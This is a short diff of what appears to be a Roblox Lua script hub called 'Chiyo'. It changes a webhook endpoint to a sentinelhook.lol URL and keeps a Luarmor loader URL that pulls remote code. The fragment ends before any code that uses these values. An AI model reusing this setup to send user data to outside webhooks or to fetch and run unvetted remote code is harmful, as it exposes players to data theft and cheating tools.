@@ -1,5 +1,5 @@
 script_hub = "Chiyo"
-webhook = "https://webhookprotector.vercel.app/api/relay/njq6i1pmpj"
+webhook = "https://sentinelhook.lol/api.php?id=S7ZtU6T7TXWVf1p"
 loader_url = "https://api.luarmor.net/files/v3/loaders/f2a0e49825fbd07bac79e7271c77e28c.lua"
 repeat wait() until game:IsLoaded()
 local HttpService = game:GetService("HttpService")
